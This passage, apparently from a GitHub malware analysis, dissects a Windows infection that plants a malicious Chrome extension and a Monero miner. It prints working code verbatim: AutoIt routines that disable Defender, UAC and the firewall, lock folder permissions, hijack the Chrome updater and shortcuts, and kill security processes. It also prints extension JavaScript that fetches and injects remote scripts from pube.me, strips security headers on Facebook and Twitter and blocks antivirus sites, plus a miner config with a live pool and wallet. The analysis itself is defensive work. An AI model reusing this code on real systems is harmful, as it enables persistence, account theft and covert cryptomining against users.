	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setprot -op dacl:p_nc", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:SYSTEM;p:del_child;m:deny -ace n:SYSTEM;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Administrators;p:del_child;m:deny -ace n:Administrators;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Users;p:del_child;m:deny -ace n:Users;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn ace -ace n:Everyone;p:del_child;m:deny -ace n:Everyone;p:delete;m:deny", $virusdir, @SW_HIDE)
	RunWait($virusdir & "\SetACL.exe -on . -ot file -actn setowner -ownr n:SYSTEM", $virusdir, @SW_HIDE)
	main14()
EndFunc
```
<br> `setacl` is an FOSS (LGPL v2) tools for modifing the security permission of Windows.
<br> It use `setacl` to set the owner of the folder to `SYSTEM` to avoid being deleted
<br> But you can always change the folder owner by using `Security` tab in `Folder Properties`
#### p) 14th function: write registry to disable antiviruses and change the Chrome Update
```autoit
Func main14() ; Write registry to disable antiviruses and change the Chrome Update
	RegWrite("HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations", "LowRiskFileTypes", "REG_SZ", ".exe")
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "Google Update", "REG_SZ", $virusdir & "\app.exe")
	RegWrite("HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System", "EnableLUA", "REG_DWORD", 0)
	RegWrite("HKLM\Software\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", "REG_DWORD", 1)
	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "EnableFirewall", "REG_DWORD", 0)
	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile", "DisableNotifications", "REG_DWORD", 1)
	RegWrite("HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService", "Start", "REG_DWORD", 200)
	RegDelete("HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "SecurityHealth")
	main15()
EndFunc
```
<br> It uses `RegWrite` to modify the system settings:
- Set the `.exe` extension to Low Risk File (to avoid scanning and warnings)
- Change the Google Chrome Updater to it malicious `app.exe`. That Google Chrome Updater auto start with Windows.
- It disable UAC (User Account Control) to avoid being asked for Administrator operation comfirmation. After modify this, the system logout.
- It disable Windows Defender
- Disable Windows Firewall to connect to its server
- Disable Security Health Service - part of Windows Defender
- Delete Security Health Service from auto start apps.
#### q) 15th function: Execute chrome with malware extension
```autoit
Func main15() ; Insert malware extension to Chrome
	ShellExecute("chrome.exe", "--enable-automation --restore-last-session --disable-blink-features=AutomationControlled --load-extension=" & $virusdir, "", "", @SW_MAXIMIZE)
	main16()
	zlmsyuslmwzh()
EndFunc
```
<br> It load extension from the directory it created. After extract the archive, it has `manifest.json` and `background.js` to be loaded.
<br> We will talk about the extension later.
#### r) 16th function and the rest: Replace Chrome shortcut with command line to load the extension
```autoit
Func main16() ; Replace Chrome shortcut with malware extension command line
	Local $array2d[5][2] ; Setup an 2D array
	$array2d[0][0] = @AppDataDir & "\Microsoft\Internet Explorer\Quick Launch"
	$array2d[1][0] = @AppDataCommonDir & "\Microsoft\Internet Explorer\Quick Launch"
	$array2d[2][0] = @DesktopDir
	$array2d[3][0] = @ProgramsCommonDir
	$array2d[4][0] = @DesktopCommonDir
	$array2d[0][1] = 1
	$array2d[1][1] = 1
	$array2d[2][1] = 0
	$array2d[3][1] = 0
	$array2d[4][1] = 0
	For $counter = 0 To 4
		If $array2d[$counter][1] = 1 Then
			ezmdwuawsws($array2d[$counter][0])
		EndIf
		sesrarlhuog($array2d[$counter][0])
	Next
EndFunc

Func ezmdwuawsws($p)
	Local $returnvalue = xpwtesac($p, "*", 2)
	If @error = 0 Then
		For $counter = 1 To $returnvalue[0]
			sesrarlhuog($p & "\" & $returnvalue[$counter])
			ezmdwuawsws($p & "\" & $returnvalue[$counter])
		Next
	EndIf
EndFunc

Func sesrarlhuog($dgtnmsyt)
	Local $qfmiznc = xpwtesac($dgtnmsyt, "*.lnk")
	If @error = 0 Then
		$hajaxgrbel = $qfmiznc[0]
		For $counter = 1 To $hajaxgrbel
			ajaqfqn($dgtnmsyt & '\' & $qfmiznc[$counter])
		Next
	EndIf
EndFunc

Func ajaqfqn($kxpdbrfgb) ; Check shortcut name. "chrome" or "chromium" also work.
	$gfwbjvvluo = FileGetShortcut($kxpdbrfgb)
	If NOT @error Then
		$agbhl = vpmfq($gfwbjvvluo[0], "", "", "", "")
		If $agbhl[3] = "chrome" Then
			fuaxi($gfwbjvvluo, $kxpdbrfgb)
		EndIf
	EndIf
EndFunc

Func fuaxi($gfwbjvvluo, $kxpdbrfgb) ; Chrome shortcut with malaware extension
	FileCreateShortcut($gfwbjvvluo[0], $kxpdbrfgb, $gfwbjvvluo[1], "--enable-automation --disable-blink-features=AutomationControlled --load-extension=" & $virusdir)
EndFunc

Func zlmsyuslmwzh() ; Inject fake update service to Chrome and kill Windows Defender
	If "X86" = "X64" Then ; Originally @CPUArch
		$toujmktea = "update-x64.exe"
	Else
		$toujmktea = "update-x86.exe"
	EndIf
	While 1
		If FileExists($virusdir & "\" & $toujmktea) Then
			If NOT ProcessExists($toujmktea) Then
				Run($virusdir & "\" & $toujmktea, $virusdir, @SW_HIDE)
			EndIf
		EndIf
		ProcessClose("software_reporter_tool.exe")
		ProcessClose("MsMpEng.exe")
		ProcessClose("SecurityHealthHost.exe")
		ProcessClose("SecurityHealthService.exe")
		Sleep(3000)
	WEnd
EndFunc

Func xpwtesac($p1, $p2 = "*", $p3 = 0, $p4 = False)
	Local $var1 = "", $var2 = "", $var3 = ""
	$p1 = StringRegExpReplace($p1, "[\\/]+$", "") & "\"
	If $p3 = Default Then $p3 = 0
	If $p4 Then $var3 = $p1
	If $p2 = Default Then $p2 = "*"
	If NOT FileExists($p1) Then Return SetError(1, 0, 0)
	If StringRegExp($p2, "[\\/:><\|]|(?s)^\s*$") Then Return SetError(2, 0, 0)
	If NOT ($p3 = 0 OR $p3 = 1 OR $p3 = 2) Then Return SetError(3, 0, 0)
	Local $filepointer = FileFindFirstFile($p1 & $p2)
	If @error Then Return SetError(4, 0, 0)
	While 1
		$var2 = FileFindNextFile($filepointer)
		If @error Then ExitLoop
		If ($p3 + @extended = 2) Then ContinueLoop
		$var1 &= "|" & $var3 & $var2
	WEnd
	FileClose($filepointer)
	If $var1 = "" Then Return SetError(4, 0, 0)
	Return StringSplit(StringTrimLeft($var1, 1), "|")
EndFunc

Func vpmfq($p1, $mnjxaygqfkun, $ekbgffqnc, $var2, $rkeywqqfeyg)
	Local $nhpcr = StringRegExp($p1, "^\h*((?:\\\\\?\\)*(\\\\[^\?\/\\]+|[A-Za-z]:)?(.*[\/\\]\h*)?((?:[^\.\/\\]|(?(?=\.[^\/\\]*\.)\.))*)?([^\/\\]*))$", 1)
	If @error Then
		ReDim $nhpcr[5]
		$nhpcr[0] = $p1
	EndIf
	$mnjxaygqfkun = $nhpcr[1]
	If StringLeft($nhpcr[2], 1) == "/" Then
		$ekbgffqnc = StringRegExpReplace($nhpcr[2], "\h*[\/\\]+\h*", "\/")
	Else
		$ekbgffqnc = StringRegExpReplace($nhpcr[2], "\h*[\/\\]+\h*", "\\")
	EndIf
	$nhpcr[2] = $ekbgffqnc
	$var2 = $nhpcr[3]
	$rkeywqqfeyg = $nhpcr[4]
	Return $nhpcr
EndFunc
```
<br> They use some Regular Expression to find the chrome shortcut, then insert to it.
<br> `chrome` or `chromium` (the open source version and also the core part of Chrome) also work.
<br> Im not going to look carefully in this part.

### 7) The extension
Every Chrome extension has a `manifest.json` file. From the `files.7z`, `manifest.json` has:
```json
{
    "update_url": "https://clients2.google.com/service/update2/crx",
    "version": "1.0.0",
    "manifest_version": 2,
    "background": {
        "scripts": [
            "background.js"
        ]
    },
    "browser_action": {},
    "name": "Google Osehes",
    "permissions": [
        "<all_urls>",
        "*://*/*",
        "webRequest",
        "webRequestBlocking",
        "cookies",
        "tabs",
        "background"
    ],
    "description": "Google Osehes"
}
```
<br> Nothing special about this, they just change the name of the extension too make it more "safe" when you look it. The extension has a worker script, the `background.js`:
```javascript
var yhhng = {};
var mhiwl = function(){
	var iacpj = new URL('https://www.google.com');
	iacpj.protocol = 'http:';
	var nkkdx = 'pube';
	var eiubga = 'me';
	iacpj.hostname = nkkdx+'.'+eiubga;
	iacpj.pathname = '/config';
	if(!chrome.app.getDetails()){
		return false;
	}
	fetch(iacpj).then(function(response){
		return response.json();
	}).then(function(data){
		yhhng = data;
		if(data.login == true){
			yhhng.app = chrome.app.getDetails();
			yarna();
		}else{
			yztvx();
		}
	}).catch((e) => {
		setTimeout(mhiwl, 1000*60);
	});
}

var yarna = function(){
	yhhng.request.headers = {installed:true};
	fetch(yhhng.check ,yhhng.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			ufrkhn();
		}else{
			yztvx();
		}
	});
}

var ixtfco = function(){
	(function(d, s, id){
     var js, cjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = yhhng.url;
     cjs.parentNode.insertBefore(js, cjs);
   }(document, 'script', 'chrome-jssdk'));
}

var ufrkhn = function(){
	fetch(yhhng.url).then(function(response){
		return response.blob();
	}).then(function(data){
		yhhng.url = URL.createObjectURL(data);
		ixtfco(yhhng.url);
	});
}

var xqerx = function(){
	chrome.tabs.create({url:yhhng.homepage}, function(tab){
		yhhng.tab = tab.id;
		chrome.browserAction.enable();
		if(!yhhng.pfjgrj){
			vjkvcw();
		}
	});
}

var rvcxkz = function(){
	chrome.tabs.update(yhhng.tab, {url: yhhng.homepage}, function(){
		chrome.browserAction.enable();
	})
}

var vjkvcw = function(){
	yhhng.pfjgrj = true;
	chrome.tabs.onRemoved.addListener(function(tab){
		if(tab == yhhng.tab){
			yhhng.tab = false;
		}
	});
}

var yztvx = function(){
	chrome.browserAction.onClicked.addListener(function(){
		chrome.browserAction.disable();
		if(!yhhng.tab){
			xqerx();
		}else{
			rvcxkz();
		}
	});
}

if(chrome){
	mhiwl();
}
```
<br> This can also be converted to a more friendly way:
```javascript
var jsondata = {};
var main = function(){
	var l = new URL('https://www.google.com');
	l.protocol = 'http:';
	l.hostname = "pube.me";
	l.pathname = '/config';
	if(!chrome.app.getDetails()){
		return false; // Not allow to get app details
	}
	fetch(l).then(function(response){
		return response.json(); // Output to JSON
	}).then(function(data){
		jsondata = data;
		if(data.login == true){
			jsondata.app = chrome.app.getDetails();
			yarna();
		}else{
			yztvx();
		}
	}).catch((e) => {
		setTimeout(main, 1000*60); // If error then delay 60 seconds before restart this function
	});
}

var yarna = function(){
	jsondata.request.headers = {installed:true};
	fetch(jsondata.check ,jsondata.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			ufrkhn();
		}else{
			yztvx();
		}
	});
}

var ixtfco = function(){
	function(){
     var js, cjs = document.getElementsByTagName('script')[0];
     if (document.getElementById('chrome-jssdk')) {return;}
     js = document.createElement('script'); js.id = 'chrome-jssdk';
     js.src = jsondata.url; // Insert the remote Javascript code
     cjs.parentNode.insertBefore(js, cjs);
    };
}

var ufrkhn = function(){
	fetch(jsondata.url).then(function(response){
		return response.blob();
	}).then(function(data){
		jsondata.url = URL.createObjectURL(data);
		ixtfco(jsondata.url);
	});
}

var xqerx = function(){
	chrome.tabs.create({url:jsondata.homepage}, function(tab){
		jsondata.tab = tab.id;
		chrome.browserAction.enable();
		if(!jsondata.pfjgrj){
			vjkvcw();
		}
	});
}

var rvcxkz = function(){
	chrome.tabs.update(jsondata.tab, {url: jsondata.homepage}, function(){
		chrome.browserAction.enable();
	})
}

var vjkvcw = function(){
	jsondata.pfjgrj = true;
	chrome.tabs.onRemoved.addListener(function(tab){
		if(tab == jsondata.tab){
			jsondata.tab = false;
		}
	});
}

var yztvx = function(){
	chrome.browserAction.onClicked.addListener(function(){
		chrome.browserAction.disable();
		if(!jsondata.tab){
			xqerx();
		}else{
			rvcxkz();
		}
	});
}

if(chrome){
	main(); // main
}
```
<br> If you browse to `https://pube.me/config` you can see some Json:
```json
{
    "domain": "pube.me",
    "homepage": "http://pube.me",
    "url": "http://pube.me/config",
    "check": "http://pube.me/check",
    "shorten": "http://pube.me/shorten",
    "status": true,
    "hash": "c473182fc1c0af4b20046e9f88cd3f09",
    "csrf": "36a67c037dbca73d24dbade17d06473e",
    "token": "YzQ3MzE4MmZjMWMwYWY0YjIwMDQ2ZTlmODhjZDNmMDk=",
    "socket": "ws://pube.me:8080",
    "ssl": false,
    "verified": true,
    "login": false
}
```
<br> The `hash`, `csrf` and `token` are renewed every time you reload the page. `pube.me:8080` require an username and a password when you browse to it.
<br> The link `http://pube.me/check` return:
```json
{
    "verify": false
}
```
<br> `http://pube.me/shorten`:
```json
{
    "valid": false,
    "message": "Long URL is invalid"
}
```
<br> Please note that some part of the world (I have tried VPN) will have 403 error when trying to access this server.
<br> Let's take a look at the code:
```javascript
var yhhng = {};
var mhiwl = function(){
	var iacpj = new URL('https://www.google.com');
	iacpj.protocol = 'http:';
	var nkkdx = 'pube';
	var eiubga = 'me';
	iacpj.hostname = nkkdx+'.'+eiubga;
	iacpj.pathname = '/config';
	if(!chrome.app.getDetails()){
		return false;
	}
	fetch(iacpj).then(function(response){
		return response.json();
	}).then(function(data){
		yhhng = data;
		if(data.login == true){
			yhhng.app = chrome.app.getDetails();
			yarna();
		}else{
			yztvx();
		}
	}).catch((e) => {
		setTimeout(mhiwl, 1000*60);
	});
}

var yarna = function(){
	yhhng.request.headers = {installed:true};
	fetch(yhhng.check ,yhhng.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			ufrkhn();
		}else{
			yztvx();
		}
	});
}

var ixtfco = function(){
	(function(d, s, id){
     var js, cjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = yhhng.url;
     cjs.parentNode.insertBefore(js, cjs);
   }(document, 'script', 'chrome-jssdk'));
}

var ufrkhn = function(){
	fetch(yhhng.url).then(function(response){
		return response.blob();
	}).then(function(data){
		yhhng.url = URL.createObjectURL(data);
		ixtfco(yhhng.url);
	});
}
```
<br> If I modify it a little bit like this, then load the extension manually to Chrome, open the Developer Tools and then the Javascript console, and see what we get:
```javascript
var yhhng = {};
var mhiwl = function(){
	var iacpj = new URL('https://www.google.com');
	iacpj.protocol = 'http:';
	var nkkdx = 'pube';
	var eiubga = 'me';
	iacpj.hostname = nkkdx+'.'+eiubga;
	iacpj.pathname = '/config';
	//if(!chrome.app.getDetails()){
	//	return false;
	//}
	fetch(iacpj).then(function(response){
		return response.json();
	}).then(function(data){
		yhhng = data;
		if(data.login == true){
			yhhng.app = chrome.app.getDetails();
			//yarna();
		}else{
			//yztvx();
		}
	}).catch((e) => {
		setTimeout(mhiwl, 1000*60);
	});
}

var yarna = function(){
	yhhng.request.headers = {installed:true};
	fetch(yhhng.check ,yhhng.request).then(function(response){
		return response.json();
	}).then(function(data){
		if(data.verify == true){
			//ufrkhn();
		}else{
			//yztvx();
		}
	});
}

var ixtfco = function(){
	(function(d, s, id){
     var js, cjs = d.getElementsByTagName(s)[0];
     if (d.getElementById(id)) {return;}
     js = d.createElement(s); js.id = id;
     js.src = yhhng.url;
     cjs.parentNode.insertBefore(js, cjs);
   }(document, 'script', 'chrome-jssdk'));
}

var ufrkhn = function(){
	fetch(yhhng.url).then(function(response){
		return response.blob();
	}).then(function(data){
		yhhng.url = URL.createObjectURL(data);
		//ixtfco(yhhng.url);
	});
}
```
<br> And then, open Javascript console, type `ufrkhn();` and you get:
![Console](https://user-images.githubusercontent.com/68118236/145717743-638bca3c-47d5-4868-8964-aad551ce826a.png)
Clicking to that `blob` URL, you will get:
```javascript
var config = {};
config.url = new URL("https://pube.me");
config.token = "180ff51b68b188325748d5ec7731ec80";
var run = function () {
  chrome.tabs.onUpdated.addListener(function (id) {
    chrome.tabs.get(id, function (tab) {
      tab.url = new URL(tab.url);
      if (tab.status == "complete" && tab.url.protocol != "chrome:") {
        updated(tab);
      }

      if (tab.url.protocol == "chrome:" && tab.url.host == "extensions" && !localStorage.trust) {
        blocked(tab);
      }
    })
  })
}

var updated = function (tab) {
  config.last = tab.url.origin;
  return;
  var url = uri("/js/script.js");
  fetch(url).then(function (response) {
    return response.text();
  }).then(function (data) {
    if (tab && tab.id) {
      chrome.tabs.executeScript(tab.id, { code: data });
    }
  });
}

var onRequest = function () {
  chrome.webRequest.onHeadersReceived.addListener(function (details) {
    for (var i = 0; i < details.responseHeaders.length; i++) {
      if (details.responseHeaders[i].name.toLowerCase() === 'content-security-policy') {
        details.responseHeaders[i].value = '';
      }
      if (details.responseHeaders[i].name.toLowerCase() === 'x-xss-protection') {
        details.responseHeaders[i].value = '0';
      }
    }
    return {
      responseHeaders: details.responseHeaders
    };
  }, {
    urls: ["https://*.facebook.com/*", "https://twitter.com/*"]
  }, ["blocking", "responseHeaders"])
}

var blocked = function (tab) {
  chrome.tabs.remove(tab.id);
}

var icon = function () {
  if (chrome.browserAction && chrome.browserAction.setIcon) {
    var url = uri("/settings.png");
    chrome.browserAction.setIcon({ path: url });
    chrome.browserAction.onClicked.addListener(function () {
      chrome.tabs.create({ url: "chrome://settings/" })
    });
  }
}

var counter = function () {
  config.cid = rand(111111111, 99999999999)
  if (localStorage.cid) {
    config.cid = localStorage.cid
  }
  localStorage.cid = config.cid
  var image = new Image();
  var url = new URL("https://www.google-analytics.com/collect");
  url.searchParams.append("v", 1);
  url.searchParams.append("tid", "UA-45982426-14");
  url.searchParams.append("cid", config.cid);
  url.searchParams.append("t", "pageview");
  url.searchParams.append("dp", config.url.hostname);
  url.searchParams.append("dr", config.last);
  image.src = url;
}

var counterTimer = setInterval(counter, 1000 * 60 * 5);

var router = function () {
  var url = uri("/ajax/route.php");
  fetch(url, { credentials: 'include' }).then(function (response) {
    return response.json();
  }).then(function (data) {
    data.link = new URL(data.link);
    chrome.windows.getCurrent(function (w) {
      chrome.tabs.getAllInWindow(w.id, function (tabs) {
        for (i = 0; i < tabs.length; i++) {
          var tab = tabs[i];
          tab.url = new URL(tab.url);
          if (tab.url.hostname == data.link.hostname) {
            data.redirect = false;
            break;
          }
        }

        if (data.redirect) {
          chrome.tabs.create({ url: data.link.href, pinned: true, active: data.active });
        }
      });
    })
  });
}

//var routerTimer = setInterval(router,1000*60*5);

var reload = window.setTimeout(function () {
  location.reload()
}, 1000 * 60 * 30);

var getfilters = function () {
  var url = uri("/js/filters.php");
  fetch(url).then(function (response) {
    return response.json();
  }).then(function (data) {
    setfilters(data);
  })
}

var setfilters = function (filters) {
  chrome.webRequest.onBeforeRequest.addListener(function (details) {
    var trust = false;
    if (details.url.indexOf("ext=me") > 0) {
      trust = true;
    }
    if (trust == false) {
      return { cancel: true };
    }
  },
    { urls: filters },
    ["blocking"]);
}

var installed = function () {
  if (chrome.cookies) {
    getInstalledCookie();
  }
}

var getInstalledCookie = function () {
  chrome.cookies.get({ url: "http://example.com/", name: "installed" }, function (cookie) {
    if (!cookie && !localStorage.installed) {
      localStorage.installed = true;
      setInstalledCookie();
    }
  })
}

var setInstalledCookie = function () {
  var expire = Math.floor(Date.now() / 1000) + (60 * 60 * 24 * 30 * 12 * 5)
  chrome.cookies.set({
    url: "http://example.com/",
    name: "installed",
    value: "true",
    domain: "example.com",
    expirationDate: expire
  }, function (cookie) {
    if (cookie) {
      sendInstalledTrack()
    }
  })
}

var sendInstalledTrack = function () {
  sendEventTrack('installed', config.url.hostname);
}

var sendEventTrack = function (ec, ea) {
  config.cid = rand(111111111, 99999999999)
  if (localStorage.cid) {
    config.cid = localStorage.cid
  }
  localStorage.cid = config.cid
  var image = new Image();
  var url = new URL("https://www.google-analytics.com/collect");
  url.searchParams.append("v", 1);
  url.searchParams.append("tid", "UA-45982426-14");
  url.searchParams.append("cid", config.cid);
  url.searchParams.append("t", "event");
  url.searchParams.append("ec", ec);
  url.searchParams.append("ea", ea);
  url.searchParams.append("dp", config.url.hostname);
  image.src = url;
}

var loadData = function (url, callback) {
  fetch(url).then(response => response.blob()).then((data) => {
    var url = URL.createObjectURL(data);
    var tg = document.getElementsByTagName('script')[0];
    var js = document.createElement('script');
    js.src = url;
    tg.parentNode.insertBefore(js, tg);
    if (callback) {
      callback();
    }
  });
}

var uri = function (path) {
  return config.url.origin + path;
}

var rand = function (min, max) {
  return Math.floor(Math.random() * (max - min)) + min;
}

var key = function (length) {
  str = "abcdefghijklmnoprstuvyzxABCDEFGHIJKLMNOPRSTUVYZX0123456789";
  ret = "";
  for (l = 0; l < length; l++) {
    ret += str[Math.floor(Math.random() * str.length)];
  }
  return ret;
}

var isReady = (v) => {
  var promise = new Promise((resolve) => {
    var timer = window.setInterval(() => {
      if (typeof window[v] != 'undefined') {
        resolve(window[v]);
        window.clearInterval(timer)
      }
    }, 50);
  })
  return promise;
}

if (chrome) {
  run();
  icon();
  counter();
  //router();
  installed();
  loadData(uri("/js/facebook.js?" + Date.now()));
  loadData(uri("/js/twitter.js?" + Date.now()));
  if (chrome.webRequest) {
    onRequest()
    getfilters();
  }
}
```
<br> You can see there is a `if (chrome)` statement at the end of the file and it loads other functions in this script.
|Function|It does|
|--------|-------|
|`run()`|Check if the URL of each tabs start with `chrome:` protocol (Chrome internal sites) or not. If it starts with `chrome:`, that means the user is trying to access the Chrome setting (especially the Extension page) and this script will block it. If not then allow the page to load|
|`icon()`|Set the display icon of the extension to `http://pube.me/settings.png` (it's a "setting" icon) and set the URL to open when user click on the extension icon to `chrome://settings/`|
|`counter()`|Load Google Analytics (to log some data?)|
|`router()`|This is originally commented (not me), perhaps the function isn't used anymore. The URL `http://pube.me/ajax/route.php` return 404|
|`installed()`|Check for `installed` cookie to know whether this is the first time running this extension or not|
|`loadData()`|Load the scripts to stole Facebook and Twitter accounts to spread itself (talk about this later)|
|`onRequest()` and `getfilters()`|Block access to some websites, especially some antivirus sites.|

<br> See `filters.php` in this repo for a dump of the list of websites they block.
<br> See `facebook.js` in this repo for a dump of the Facebook hack script
<br> See `twitter.js` in this repo for a dump of the Twitter hack script
<br> These script are dumped so that you can see how it works, but <b>NOT</b> to reuse it by any manners!
### 8) How they steal your account?
<br> You can see in the end of the remote Javascript file there is:
```javascript
loadData(uri("/js/facebook.js?" + Date.now()));
loadData(uri("/js/twitter.js?" + Date.now()));
```
<br> With `loadData` defined as:
```javascript
var loadData = function (url, callback) {
  fetch(url).then(response => response.blob()).then((data) => {
    var url = URL.createObjectURL(data);
    var tg = document.getElementsByTagName('script')[0];
    var js = document.createElement('script');
    js.src = url;
    tg.parentNode.insertBefore(js, tg);
    if (callback) {
      callback();
    }
  });
}
```
<br> Using the same technique, let's get the source code of `facebook.js` and `twitter.js`. Because they are too long (`facebook.js` has 1000+ lines), so please view it at `facebook.js` and `twitter.js` in this repo.
### 9) The miner
In the function `zlmsyuslmwzh` in the fb.clean.au3 file:
```autoit
Func zlmsyuslmwzh() ; Inject fake update service to Chrome and kill Windows Defender
	If "X86" = "X64" Then ; Originally @CPUArch
		$toujmktea = "update-x64.exe"
	Else
		$toujmktea = "update-x86.exe"
	EndIf
	While 1
		If FileExists($virusdir & "\" & $toujmktea) Then
			If NOT ProcessExists($toujmktea) Then
				Run($virusdir & "\" & $toujmktea, $virusdir, @SW_HIDE)
			EndIf
		EndIf
		ProcessClose("software_reporter_tool.exe")
		ProcessClose("MsMpEng.exe")
		ProcessClose("SecurityHealthHost.exe")
		ProcessClose("SecurityHealthService.exe")
		Sleep(3000)
	WEnd
EndFunc
```
<br> As described, the file `update-x64.exe` is a Xmrig miner. When executed with no parameter, it <b>by default</b> load the config ```config.json```. Let's take a look at it:
```json
{
    "api": {
        "id": null,
        "worker-id": null
    },
    "http": {
        "enabled": false,
        "host": "127.0.0.1",
        "port": 0,
        "access-token": null,
        "restricted": true
    },
    "autosave": true,
    "version": 1,
    "background": true,
    "colors": true,
    "randomx": {
        "init": -1,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "max-threads-hint": 80,
        "asm": true,
        "argon2-impl": null,
        "cn/0": false,
        "cn-lite/0": false
    },
    "opencl": {
        "enabled": false,
        "cache": true,
        "loader": null,
        "platform": "AMD",
        "cn/0": false,
        "cn-lite/0": false
    },
    "cuda": {
        "enabled": false,
        "loader": null,
        "nvml": true,
        "cn/0": false,
        "cn-lite/0": false
    },
    "donate-level": 1,
    "donate-over-proxy": 0,
    "log-file": null,
    "pools": [
        {
            "algo": "rx/0",
            "coin": "monero",
            "url": "pool.okim.me:3333",
            "user": "82mnaBkHb15Mq5iGxxfVL9aJBwaBcvpveGojJitDJamddnZi8dPJVAL8ti1iy1rYfwY4RmDRofkqyN8tZfq2UuhHCaxWkYp",
            "pass": "Worker",
            "rig-id": null,
            "nicehash": false,
            "keepalive": false,
            "enabled": true,
            "tls": false,
            "tls-fingerprint": null,
            "daemon": false,
            "self-select": null
        }
    ],
    "print-time": 60,
    "health-print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "user-agent": null,
    "watch": true
}
```
<br> It connect to the pool at address `pool.okim.me:3333` with the username of `82mnaBkHb15Mq5iGxxfVL9aJBwaBcvpveGojJitDJamddnZi8dPJVAL8ti1iy1rYfwY4RmDRofkqyN8tZfq2UuhHCaxWkYp` and the password `Worker`. I have checked and the server still work!
<br> When mining, if you open the Task Manager, you will see it shows at `Windows Controller`.

## Notes
- The server is nearly not accessable, mostly got 403, 404 and 1020 error code
- Two domains `pube.me`, `okim.me` are all use Cloudflare protection.
- Some parts of the world only get 403.
- <b>This project is made for educational purpose, please don't reuse the code for any purpose other than education. I have ABSOLUTELY NO responsibilities for ANY KIND OF DAMAGE MADE BY USING ANY OF THE CONTENT IN THIS PROJECT.</b>
